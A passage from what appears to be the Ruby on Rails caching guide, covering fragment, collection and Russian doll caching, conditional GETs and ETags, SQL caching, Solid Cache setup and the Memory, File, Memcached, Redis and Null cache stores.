used with the storage engine. They may be modified with a namespace or altered
to fit technology backend constraints. This means, for instance, that you can't
save values with `Rails.cache` and then try to pull them out with the
[`dalli`](https://github.com/petergoldstein/dalli) gem. However, you also don't
need to worry about exceeding the memcached size limit or violating syntax
rules.

#### Avoid Caching Instances of Active Record Objects

You should __avoid__ storing a list of Active Record objects in the cache:

```ruby
# super_admins is an expensive SQL query, so don't run it too often
Rails.cache.fetch("super_admin_users", expires_in: 12.hours) do
  User.super_admins.to_a
end
```

In the example above, the instance of the `User`, representing `superusers`,
could change, and the attributes on it could differ, or the record could be
deleted. In development, this also works unreliably with cache stores that
reload code when you make changes.

Instead, cache the ID of the resource or some other primitive data type. For
example:

```ruby
ids = Rails.cache.fetch("super_admin_user_ids", expires_in: 12.hours) do
  User.super_admins.pluck(:id)
end
User.where(id: ids).to_a
```

### Fragment Caching

Dynamic web applications build pages with a variety of components not all of
which have the same caching characteristics. For example, a static component,
such as a site logo, will have a longer caching duration compared to other more
dynamic components. To cache and expire different parts of the page separately
you can use Fragment Caching.

Fragment Caching allows a fragment of view logic to be wrapped in a cache block
and served out of the cache store when the next request comes in.

For example, if you wanted to cache each product on a page, you could do the
following:

```html+erb
<% @products.each do |product| %>
  <% cache product do %>
    <%= render product %>
  <% end %>
<% end %>
```

When your application receives its first request to this page, Rails will write
a new cache entry with a unique key. The key looks something like this:

```
views/products/index:bea67108094918eeba42cd4a6e786901/products/1
```

The string of characters in the middle is a template tree digest. It is a hash
computed from the contents of the view fragment you are caching. If you change
that fragment, such as by updating the HTML, the digest changes and Rails will
treat it as a different cache entry.

A cache version, derived from the product record, is stored in the cache entry.
When the product is touched, the cache version changes, and any cached fragments
that contain the previous version are ignored.

Separating the cache key from the cache version allows Rails to reuse the cache
key, instead of creating a new entry every time. No matter how frequently the
product is touched, Rails writes to the same cache key. This reduces the total
cache size because outdated cache entries are overwritten with the new entry.

TIP: Cache stores like [Memcached](https://memcached.org) automatically evict
old cache entries when they need to reclaim space.

If you want to cache a fragment under certain conditions, you can use `cache_if`
or `cache_unless`:

```erb
<% cache_if admin?, product do %>
  <%= render product %>
<% end %>
```

#### Collection Caching

The `render` helper can also cache each template in a collection. Instead of
checking the cache one item at a time in an `each` loop, Rails can fetch the
cached entries for the whole collection at once. You enable this by passing
`cached: true` when rendering the collection:

```html+erb
<%= render partial: 'products/product', collection: @products, cached: true %>
```

Cached entries from previous renders will be read in a single multi-fetch.
Templates that are not yet cached will be rendered and written to the cache, so
they can be fetched the same way on the next render.

The cache key can be configured. In the example below, it is prefixed with the
current locale to ensure that different localizations of the product page do not
overwrite each other:

```html+erb
<%= render partial: 'products/product',
           collection: @products,
           cached: ->(product) { [I18n.locale, product] } %>
```

You can also configure `cached` with an options hash that accepts `expires_in`
and `key`, so you can control the cache key and expiration explicitly.

```html+erb
<%= render partial: 'products/product',
           collection: @products,
           cached: { expires_in: 1.hour, key: ->(product) { [I18n.locale, product] } } %>
```

#### Managing Dependencies

When using fragment caching, you need to define template dependencies so Rails
can invalidate cached fragments correctly. Rails can infer many common cases,
but when rendering happens in helpers or through less direct `render` calls, you
may need to declare dependencies explicitly.

##### Implicit Dependencies

Rails can infer many template dependencies directly from `render` calls in the
template. For example, the
[`ActionView::Digestor`](https://api.rubyonrails.org/classes/ActionView/Digestor.html)
can understand calls like these:

```ruby
render partial: "comments/comment", collection: commentable.comments
render "comments/comments"
render("comments/comments")

render "header" # translates to render("comments/header")

render(@topic)         # translates to render("topics/topic")
render(topics)         # translates to render("topics/topic")
render(message.topics) # translates to render("topics/topic")
```

Some render calls need more information before Rails can infer the template
dependency. For example, when you pass a custom collection like this:

```ruby
render @project.documents.where(published: true)
```

You'll need to rewrite it to name the partial and collection explicitly:

```ruby
render partial: "documents/document", collection: @project.documents.where(published: true)
```

##### Explicit Dependencies

Sometimes Rails cannot see a template dependency on its own. This usually
happens when the `render` call is hidden inside a helper method.

```html+erb
<%= render_sortable_todolists @project.todolists %>
```

In that case, declare the dependency explicitly with a special comment:

```html+erb
<%# Template Dependency: todolists/todolist %>
<%= render_sortable_todolists @project.todolists %>
```

In some cases, such as a [single table
inheritance](association_basics.html#single-table-inheritance-sti) setup, a helper
may render different partials from the same directory. Instead of listing each
template individually, you can use a wildcard to match the whole directory:

```html+erb
<%# Template Dependency: events/* %>
<%= render_categorizable_events @person.events %>
```

There is also a special comment for collection caching when the cache call is
hidden inside a helper. If the partial template does not start with a clean
cache call, you can add this comment anywhere in the template:

```html+erb
<%# Template Collection: notification %>
<% my_helper_that_calls_cache(some_arg, notification) do %>
  <%= notification.name %>
<% end %>
```

##### External Dependencies

Changes outside the template file can also affect the cached output. For
example, if a cached block calls a helper method, updating that helper will not
change the template digest automatically.

When that happens, update the template in some way so its digest changes too.
One simple approach is to add or update a comment like this:

```html+erb
<%# Helper Dependency Updated: Jul 28, 2015 at 7pm %>
<%= some_helper_method(person) %>
```

### Russian Doll Caching

You may want to nest cached fragments inside other cached fragments. This is
called Russian doll caching.

The advantage of Russian doll caching is that if a single product is updated,
all the other inner fragments can be reused when regenerating the outer
fragment.

As explained in the previous section, a cached fragment will become stale if the
`updated_at` value changes for a record it directly depends on. However, that
does not automatically expire any outer fragment that contains it.

For example, take the following view:

```erb
<% cache product do %>
  <%= render product.reviews %>
<% end %>
```

Which in turn renders this view:

```erb
<% cache review do %>
  <%= render review %>
<% end %>
```

If a `review` changes, its `updated_at` value changes too, which expires that
fragment. But the `product` record's `updated_at` does not change automatically,
so the outer fragment can still serve stale data. To fix this, tie the models
together with the `touch` method:

```ruby
class Product < ApplicationRecord
  has_many :reviews
end

class Review < ApplicationRecord
  belongs_to :product, touch: true
end
```

With `touch` set to `true`, any action which changes `updated_at` for a review
record will also change it for the associated product, thereby expiring the
cache.

### Shared Partial Caching

You can share partials, and their cached output, across templates with different
[MIME
types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types).
For example, the same partial can be reused from both HTML and JavaScript
templates. When Rails resolves `render partial:`, it can use a partial without
an explicit format in more than one response format. Both HTML and JavaScript
requests can use the following code:

```ruby
render(partial: "hotels/hotel", collection: @hotels, cached: true)
```

This will load a file named `hotels/_hotel.html.erb`.

Another option is to specify the `formats` option explicitly.

```ruby
render(partial: "hotels/hotel", collection: @hotels, formats: :html, cached: true)
```

This will load `hotels/_hotel.html.erb` even when it is rendered from a template
with a different MIME type, such as a JavaScript template.

### Conditional GETs

Conditional GETs let a server tell the browser that a response has not changed
since the last request, so the browser can reuse its cached copy.

This is useful when a browser or intermediary cache may already have a recent
copy of a response and you want to avoid sending the full response body again.

They work with the `If-None-Match` and `If-Modified-Since` request headers,
using an [ETag](#strong-vs-weak-etags) and/or a last-modified timestamp to check
whether the response is still fresh. If the browser's copy matches the server's
version, the server can return `304 Not Modified` with no response body.

It is the server's responsibility to evaluate those headers and decide whether
to send a full response. Rails makes this straightforward:

```ruby
class ProductsController < ApplicationController
  def show
    @product = Product.find(params[:id])

    # If the request is stale according to the given timestamp and etag value
    # (i.e. it needs to be processed again) then execute this block
    if stale?(last_modified: @product.updated_at.utc, etag: @product.cache_key_with_version)
      respond_to do |wants|
        # ... normal response processing
      end
    end

    # If the request is fresh (i.e. it's not modified) then you don't need to do
    # anything. The default render checks for this using the parameters
    # used in the previous call to stale? and will automatically send a
    # :not_modified. So that's it, you're done.
  end
end
```

Instead of an options hash, you can also simply pass in a model. Rails will use
the `updated_at` and `cache_key_with_version` methods for setting
`last_modified` and `etag`:

```ruby
class ProductsController < ApplicationController
  def show
    @product = Product.find(params[:id])

    if stale?(@product)
      respond_to do |wants|
        # ... normal response processing
      end
    end
  end
end
```

If you don't have any special response processing and are using the default
rendering mechanism (i.e. you're not using `respond_to` or calling render
yourself) then you've got an easy helper in `fresh_when`:

```ruby
class ProductsController < ApplicationController
  # This will automatically send back a :not_modified if the request is fresh,
  # and will render the default template (product.*) if it's stale.

  def show
    @product = Product.find(params[:id])
    fresh_when last_modified: @product.published_at.utc, etag: @product
  end
end
```

Instead of an options hash, you can also pass in a model. Rails will use the
`updated_at` and `cache_key_with_version` methods for setting `last_modified`
and `etag`:

```ruby
class ProductsController < ApplicationController
  def show
    @product = Product.find(params[:id])
    fresh_when @product
  end
end
```

When both `last_modified` and `etag` are set, the behavior depends on
`config.action_dispatch.strict_freshness`. If it is `true`, only the `etag` is
considered, as specified by RFC 7232 section 6. If it is `false`, both headers
are checked and the response is considered fresh only if they both match.

Conditional requests apply to the HTTP QUERY method
([RFC 10008](https://www.rfc-editor.org/rfc/rfc10008)) exactly as they do to
GET: `fresh_when` and `stale?` in a QUERY action answer a matching
`If-None-Match` with `304 Not Modified`. Note that the middleware-level
`Rack::ConditionalGet` only handles GET and HEAD, so QUERY freshness is served
at the controller level by these helpers.

#### Strong vs. Weak ETags

An ETag is a token (often a hash) that uniquely represents a particular version
of a response body. If the server sends an ETag, the browser can later send it
back to ask "is this still the same?" without fetching the full response.

Rails generates weak ETags by default. Weak ETags allow semantically equivalent
responses to share the same ETag even if their response bodies do not match
byte-for-byte. This can be useful when minor representation differences occur
that do not change the meaning of the response, such as insignificant whitespace
or formatting changes.

Weak ETags have a leading `W/` to differentiate them from strong ETags.

```
W/"618bbc92e2d35ea1945008b42799b0e7" -> Weak ETag
"618bbc92e2d35ea1945008b42799b0e7" -> Strong ETag
```

Unlike weak ETags, a strong ETag means the response body must match exactly,
byte for byte. This is useful for `Range` requests on large files such as videos
or PDFs. Some CDNs also require strong ETags. If you need to generate a strong
ETag, you can do so as follows:

```ruby
class ProductsController < ApplicationController
  def show
    @product = Product.find(params[:id])
    fresh_when last_modified: @product.published_at.utc, strong_etag: @product
  end
end
```

You can also set the strong ETag directly on the response.

```ruby
response.strong_etag = response.body # => "618bbc92e2d35ea1945008b42799b0e7"
```

Sometimes you want to cache a response that effectively never changes, such as a
static page. In that case, you can use the `http_cache_forever` helper so
browsers and proxies cache it for a very long time.

By default cached responses will be private, cached only on the user's web
browser. To allow proxies to cache the response, set `public: true` to indicate
that they can serve the cached response to all users.

This helper sets `last_modified` to `Time.new(2011, 1, 1).utc` and applies a
very long `Cache-Control` lifetime.

WARNING: Use this method carefully. Browsers and proxies will keep reusing the
response until it changes at a different URL or the cache is cleared.

```ruby
class HomeController < ApplicationController
  def index
    http_cache_forever(public: true) do
      render
    end
  end
end
```

### SQL Caching

Query caching is an Active Record feature that caches the result set returned by
each query. If the same query runs again during the same request or execution
context, Active Record can reuse the stored result instead of asking the
database again.

For example:

```ruby
class ProductsController < ApplicationController
  def index
    # Run a find query
    @products = Product.all

    # ...

    # Run the same query again
    @products = Product.all
  end
end
```

The second time the same query runs, it does not hit the database. Active Record
reads the cached result from memory instead. However, each retrieval still
instantiates new model objects from that cached result.

NOTE: Query caches are created at the start of an action and destroyed at the
end of that action, so they persist only for the duration of the request. If
you'd like to store query results in a more persistent fashion, use low-level
caching.

Default Store: Solid Cache
--------------------------

Solid Cache is a database-backed Active Support cache store. It is the default
cache store for new Rails applications. Solid Cache is a good fit when you want
a larger, more durable cache without running a separate cache service such as
Redis or Memcached.

Solid Cache uses a FIFO (First In, First Out) caching strategy, where the first
item added to the cache is the first one to be removed when the cache reaches
its limit. This approach is simpler but less efficient compared to an LRU (Least
Recently Used) cache, which removes the least recently accessed items first,
better optimizing for frequently used data. However, Solid Cache compensates for
the lower efficiency of FIFO by allowing the cache to live longer, reducing the
frequency of invalidations.

New Rails applications generated with Rails 8.0 and later include Solid Cache by
default. However, if you'd prefer not to use it, you can skip Solid Cache:

```bash
$ bin/rails new app_name --skip-solid
```

NOTE: Using the `--skip-solid` flag skips all parts of the Solid Trifecta (Solid
Cache, Solid Queue, and Solid Cable). If you still want to use some of them, you
can install them separately. For example, if you want to use Solid Queue and
Solid Cable but not Solid Cache, you can follow the installation guides for
[Solid Queue](https://github.com/rails/solid_queue#installation) and [Solid
Cable](https://github.com/rails/solid_cable#installation).

### Configuring the Database

To use Solid Cache, you can configure the database connection in your
`config/database.yml` file. Here's an example configuration for a SQLite
database:

```yaml
production:
  primary:
    <<: *default
    database: storage/production.sqlite3
  cache:
    <<: *default
    database: storage/production_cache.sqlite3
    migrations_paths: db/cache_migrate
```

In this configuration, the `cache` database is used to store cached data. You
can also specify a different database adapter, like MySQL or PostgreSQL, if you
prefer.

```yaml
production:
  primary: &primary_production
    <<: *default
    database: app_production
    username: app
    password: <%= ENV["APP_DATABASE_PASSWORD"] %>
  cache:
    <<: *primary_production
    database: app_production_cache
    migrations_paths: db/cache_migrate
```

If `database` or [`databases`](#sharding-the-cache) is not specified in the
cache configuration, Solid Cache uses the `ActiveRecord::Base` connection pool.
That means cache reads and writes participate in any surrounding database
transaction.

To use Solid Cache as your cache store, configure the environment accordingly:

```ruby
# config/environments/production.rb
config.cache_store = :solid_cache_store
```

You can [access the cache by calling
`Rails.cache`](#low-level-caching-using-rails-cache).


### Customizing the Cache Store

Solid Cache can be customized through `config/cache.yml`:

```yaml
default: &default
  store_options:
    # Cap age of oldest cache entry to fulfill retention policies
    max_age: <%= 60.days.to_i %>
    max_size: <%= 256.megabytes %>
    namespace: <%= Rails.env %>
```

For the full list of keys under `store_options`, see [Cache
configuration](https://github.com/rails/solid_cache#cache-configuration).

Here, you can adjust the `max_age` and `max_size` options to control the age and
size of the cache entries.

### Handling Cache Expiration

Solid Cache tracks cache writes by incrementing a counter with each write. When
the counter reaches 50% of the `expiry_batch_size` from the [Cache
configuration](https://github.com/rails/solid_cache#cache-configuration), a
background task is triggered to handle cache expiry. This approach ensures cache
records expire faster than they are written when the cache needs to shrink.

The background task only runs when there are writes, so the process stays idle
when the cache is not being updated. If you prefer to run the expiry process in
a background job instead of a thread, set `expiry_method` from the [Cache
configuration](https://github.com/rails/solid_cache#cache-configuration) to
`:job`.

### Sharding the Cache

If you need more scalability, Solid Cache supports sharding, splitting the cache
across multiple databases. This spreads the load, making your cache even more
powerful. To enable sharding, add multiple cache databases to your
`database.yml`:

```yaml
# config/database.yml
production:
  cache_shard1:
    database: cache1_production
    host: cache1-db
  cache_shard2:
    database: cache2_production
    host: cache2-db
  cache_shard3:
    database: cache3_production
    host: cache3-db
```

Additionally, you must specify the shards in the cache configuration:

```yaml
# config/cache.yml
production:
  databases: [cache_shard1, cache_shard2, cache_shard3]
```

### Encryption

Solid Cache supports encryption to protect sensitive data. To enable encryption,
set the `encrypt` value in your cache configuration:

```yaml
# config/cache.yml
production:
  encrypt: true
```

You will need to set up your application to use [Active Record
Encryption](active_record_encryption.html).

Other Cache Stores
------------------

Rails provides different stores for the cached data (with the exception of SQL
Caching).

### Configuration

You can set up a different cache store by setting the `config.cache_store`
configuration option. Other parameters can be passed as arguments to the cache
store's constructor:

```ruby
config.cache_store = :memory_store, { size: 64.megabytes }
```

Alternatively, you can set `ActionController::Base.cache_store` outside a
configuration block.

You can access the cache by calling `Rails.cache`.

#### Connection Pool Options

[`:mem_cache_store`](#activesupport-cache-memcachestore) and
[`:redis_cache_store`](#activesupport-cache-rediscachestore) are configured to
use connection pooling. This means that if you're using Puma, or another
threaded server, you can have multiple threads performing queries to the cache
store at the same time.

If you want to disable connection pooling, set the `:pool` option to `false`
when configuring the cache store:

```ruby
config.cache_store = :mem_cache_store, "cache.example.com", { pool: false }
```

You can also override default pool settings by providing individual options to
the `:pool` option:

```ruby
config.cache_store = :mem_cache_store, "cache.example.com", { pool: { size: 32, timeout: 1 } }
```

* `:size` - This option sets the number of connections per process (defaults to
  5).

* `:timeout` - This option sets the number of seconds to wait for a connection
  (defaults to 5). If no connection is available within the timeout, a
  `Timeout::Error` will be raised.

### `ActiveSupport::Cache::Store`

[`ActiveSupport::Cache::Store`][] provides the foundation for interacting with
the cache in Rails. This is an abstract class, and you cannot use it on its own.
Instead, you must use a concrete implementation of the class tied to a storage
engine. Rails ships with several implementations, documented below.

The main API methods are [`read`][ActiveSupport::Cache::Store#read],
[`write`][ActiveSupport::Cache::Store#write],
[`delete`][ActiveSupport::Cache::Store#delete],
[`exist?`][ActiveSupport::Cache::Store#exist?], and
[`fetch`][ActiveSupport::Cache::Store#fetch].

Options passed to the cache store's constructor will be treated as default
options for the appropriate API methods.

[`ActiveSupport::Cache::Store`]:
    https://api.rubyonrails.org/classes/ActiveSupport/Cache/Store.html
[ActiveSupport::Cache::Store#delete]:
    https://api.rubyonrails.org/classes/ActiveSupport/Cache/Store.html#method-i-delete
[ActiveSupport::Cache::Store#exist?]:
    https://api.rubyonrails.org/classes/ActiveSupport/Cache/Store.html#method-i-exist-3F
[ActiveSupport::Cache::Store#fetch]:
    https://api.rubyonrails.org/classes/ActiveSupport/Cache/Store.html#method-i-fetch
[ActiveSupport::Cache::Store#read]:
    https://api.rubyonrails.org/classes/ActiveSupport/Cache/Store.html#method-i-read
[ActiveSupport::Cache::Store#write]:
    https://api.rubyonrails.org/classes/ActiveSupport/Cache/Store.html#method-i-write

### `ActiveSupport::Cache::MemoryStore`

[`ActiveSupport::Cache::MemoryStore`][] keeps entries in memory in the same Ruby
process. The cache store has a bounded size specified by sending the `:size`
option to the initializer (default is 32Mb). When the cache exceeds the allotted
size, a cleanup will occur and the least recently used entries will be removed.

```ruby
config.cache_store = :memory_store, { size: 64.megabytes }
```

If you're running multiple Ruby on Rails server processes (which is the case if
you're using Phusion Passenger or Puma in clustered mode), then your Rails
server process instances won't be able to share cache data with each other. This
cache store is not appropriate for large application deployments. However, it
can work well for small, low traffic sites with only a couple of server
processes, as well as development and test environments.

New Rails applications use this cache store in development by default.

NOTE: Since processes will not share cache data when using `:memory_store`,
changes made in a Rails console affect only that console process, not any
running server processes.

[`ActiveSupport::Cache::MemoryStore`]:
    https://api.rubyonrails.org/classes/ActiveSupport/Cache/MemoryStore.html

### `ActiveSupport::Cache::FileStore`

[`ActiveSupport::Cache::FileStore`][] uses the file system to store entries. You
must specify the path to the directory where the cache files will be stored when
initializing the cache.

```ruby
config.cache_store = :file_store, "/path/to/cache/directory"
```

With this cache store, multiple server processes on the same host can share a
cache. This cache store is appropriate for low to medium traffic sites that are
served off one or two hosts. Server processes running on different hosts could
share a cache by using a shared file system, but that setup is not recommended.

As the cache will grow until the disk is full, it is recommended to periodically
clear out old entries.


[`ActiveSupport::Cache::FileStore`]:
    https://api.rubyonrails.org/classes/ActiveSupport/Cache/FileStore.html

### `ActiveSupport::Cache::MemCacheStore`

[`ActiveSupport::Cache::MemCacheStore`][] uses [`memcached`][] to provide a
centralized cache for your application. Rails uses the bundled `dalli` gem by
default. It can provide a single shared cache cluster with high performance and
redundancy.

When initializing the cache, you should specify the addresses for all memcached
servers in your cluster, or ensure the `MEMCACHE_SERVERS` environment variable
has been set appropriately.

```ruby
config.cache_store = :mem_cache_store, "cache-1.example.com", "cache-2.example.com"
```

If neither are specified, it will assume memcached is running on localhost on
the default port (`127.0.0.1:11211`), but this is not an ideal setup for larger
sites.

```ruby
config.cache_store = :mem_cache_store # Will fallback to $MEMCACHE_SERVERS, then 127.0.0.1:11211
```

See the [`Dalli::Client`
documentation](https://www.rubydoc.info/gems/dalli/Dalli/Client#initialize-instance_method)
for supported address types.

The [`write`][ActiveSupport::Cache::MemCacheStore#write] (and `fetch`) method on
this cache accepts additional options that take advantage of features specific
to memcached.

[`ActiveSupport::Cache::MemCacheStore`]:
    https://api.rubyonrails.org/classes/ActiveSupport/Cache/MemCacheStore.html
[`memcached`]: https://memcached.org/
[ActiveSupport::Cache::MemCacheStore#write]:
    https://api.rubyonrails.org/classes/ActiveSupport/Cache/MemCacheStore.html#method-i-write

### `ActiveSupport::Cache::RedisCacheStore`

[`ActiveSupport::Cache::RedisCacheStore`][] takes advantage of [Redis][] support
for automatic eviction when it reaches max memory, allowing it to behave much
like a Memcached cache server.

NOTE: Redis does not expire keys by default, so you should use a dedicated Redis
cache server and avoid filling your persistent Redis instance with volatile
cache data. See the [Redis cache server setup
guide](https://redis.io/topics/lru-cache) for more details.

For a cache-only Redis server, set `maxmemory-policy` to one of the variants of
allkeys. Least-frequently-used eviction (`allkeys-lfu`) is a good default
choice.

Set cache read and write timeouts relatively low. Regenerating a cached value is
often faster than waiting more than a second to retrieve it. Both read and write
timeouts default to 1 second, but may be set lower if your network is
consistently low-latency.

By default, the cache store will attempt to reconnect to Redis once if the
connection fails during a request.

Cache reads and writes never raise exceptions; they just return `nil` instead,
behaving as if there was nothing in the cache. To gauge whether your cache is
hitting exceptions, you may provide an `error_handler` to report to an exception
gathering service. It must accept three keyword arguments: `method`, the cache
store method that was originally called; `returning`, the value that was
returned to the user, typically `nil`; and `exception`, the exception that was
rescued.

To get started, add the redis gem to your Gemfile:

```ruby
gem "redis"
```

Finally, add the configuration in the relevant `config/environments/*.rb` file:

```ruby
config.cache_store = :redis_cache_store, { url: ENV["REDIS_URL"] }
```

A more complex, production Redis cache store may look something like this:

```ruby
cache_servers = %w(redis://cache-01:6379/0 redis://cache-02:6379/0)
config.cache_store = :redis_cache_store, { url: cache_servers,

  connect_timeout:    30,  # Defaults to 1 second
  read_timeout:       0.2, # Defaults to 1 second
  write_timeout:      0.2, # Defaults to 1 second
  reconnect_attempts: 2,   # Defaults to 1

  error_handler: -> (method:, returning:, exception:) {
    # Report errors to Sentry as warnings
    Sentry.capture_exception exception, level: "warning",
      tags: { method: method, returning: returning }
  }
}
```

[`ActiveSupport::Cache::RedisCacheStore`]:
    https://api.rubyonrails.org/classes/ActiveSupport/Cache/RedisCacheStore.html
[Redis]: https://redis.io/

### `ActiveSupport::Cache::NullStore`

[`ActiveSupport::Cache::NullStore`][] does not persist cached values across
requests. It is meant for use in development and test environments. It can be
very useful when you have code that interacts directly with `Rails.cache` but
caching interferes with seeing the results of code changes.

```ruby
config.cache_store = :null_store
```

[`ActiveSupport::Cache::NullStore`]:
    https://api.rubyonrails.org/classes/ActiveSupport/Cache/NullStore.html

### Custom Cache Stores

You can create your own custom cache store by simply extending
`ActiveSupport::Cache::Store` and implementing the appropriate methods. This
way, you can swap in any number of caching technologies into your Rails
application.

To use a custom cache store, simply set the cache store to a new instance of
your custom class.

```ruby
config.cache_store = MyCacheStore.new
```

Advanced Caching Patterns
-------------------------

### Caching in Background Jobs and Other Non-Request Contexts

Caching is not limited to controller actions. You can also use `Rails.cache` in
background jobs, service objects, scripts, and other application code.

Low-level caching works the same way in these contexts as it does in a request:

```ruby
class ReportJob < ApplicationJob
  def perform(account)
    Rails.cache.fetch([account, "daily-report"], expires_in: 1.hour) do
      account.generate_daily_report
    end
  end
end
```

Some caching behavior, however, depends on being inside a Rails execution
context. Features such as the Active Record query cache and other per-execution
state are set up automatically for normal Rails-managed requests and jobs.

If you run application code yourself from a custom thread or long-running
script, wrap it with `Rails.application.executor.wrap` so Rails can manage that
state correctly:

```ruby
Rails.application.executor.wrap do
  Rails.cache.fetch("stats", expires_in: 5.minutes) { expensive_calculation }
end
```

For more on the Executor and non-request code execution, see [Threading and Code
Execution in Rails](threading_and_code_execution.html).

### Local Cache

Some cache stores support a local cache layer. This keeps recently read values
in memory for the duration of a request or block, so repeated reads for the same
key can be served without going back to the underlying cache store.

This is especially useful with remote cache stores such as Redis or Memcached,
where avoiding repeated network round trips can improve performance.

In a normal Rails request, the local cache is managed for you by middleware. You
can also use it manually around a block:

```ruby
Rails.cache.with_local_cache do
  Rails.cache.read("hot-key")
  Rails.cache.read("hot-key")
end
```

The local cache is temporary and scoped to the current execution. It does not
replace your main cache store, and values written there are not shared across
requests, jobs, or processes.
